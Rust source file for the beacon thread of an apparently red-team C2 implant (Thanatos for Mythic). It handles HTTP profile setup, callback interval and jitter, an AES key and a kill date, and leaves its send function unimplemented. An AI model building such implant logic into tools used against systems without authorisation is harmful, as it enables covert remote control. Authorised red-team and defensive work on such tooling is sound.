use std::time::Duration;

use chrono::{DateTime, Utc};
use crossbeam_channel::{select, tick, Receiver, Sender};
use profiles::beacon::http::HttpC2Profile;
use thanatos_protos::{
    config::Config,
    msg::{AgentMessage, MythicResponse},
};

use crate::{errors::ThanatosError, log};

use super::ipc::ProfileIPCMsg;

pub struct BeaconManager {
    callback_interval: u32,
    callback_jitter: u32,
    http: Option<HttpManager>,
}

struct HttpManager {
    killdate: DateTime<Utc>,
    aeskey: Option<[u8; 32]>,
    profile: HttpC2Profile,
}

impl BeaconManager {
    pub fn new(config: &Config) -> Option<BeaconManager> {
        let mut callback_jitter = 0;
        let mut callback_interval = 0;

        let http = config.http.as_ref().and_then(|http| {
            callback_interval = http.callback_interval;
            callback_jitter = http.callback_jitter;
            let killdate = DateTime::from_timestamp(http.killdate as i64, 0)?;

            let profile = HttpC2Profile::new(http);

            let aeskey: Option<[u8; 32]> = if !http.aes_key.is_empty() {
                http.aes_key[..].try_into().ok()
            } else {
                None
            };
            Some(HttpManager {
                killdate,
                profile,
                aeskey,
            })
        });

        if http.is_none() {
            return None;
        }

        Some(BeaconManager {
            callback_interval,
            callback_jitter,
            http,
        })
    }

    pub fn run(
        mut self,
        sender: Sender<MythicResponse>,
        receiver: Receiver<ProfileIPCMsg>,
    ) -> Result<(), ThanatosError> {
        while self.http.is_some() {
            log!("Beacon thread polling");

            select! {
                recv(receiver) -> received => {
                    match received {
                        Ok(ProfileIPCMsg::UpdateSleep{ interval, jitter }) => self.update_sleep(interval, jitter),
                        Ok(ProfileIPCMsg::C2Data(data)) => sender.send(self.send_data(data)?).unwrap(),
                        Err(_) => continue,
                    }
                },
                recv(tick(Duration::from_secs(5))) -> _ => (),
            }

            log!("Beacon thread poll finished");
            let current_time: DateTime<Utc> = std::time::SystemTime::now().into();
            let _ = self.http.take_if(|http| http.killdate <= current_time);
        }

        Ok(())
    }

    fn update_sleep(&mut self, interval: u32, jitter: u32) {
        self.callback_interval = interval;
        self.callback_jitter = jitter;
    }

    fn send_data(&mut self, data: AgentMessage) -> Result<MythicResponse, ThanatosError> {
        std::thread::sleep(std::time::Duration::from_secs(
            self.callback_interval as u64,
        ));

        todo!();
    }
}
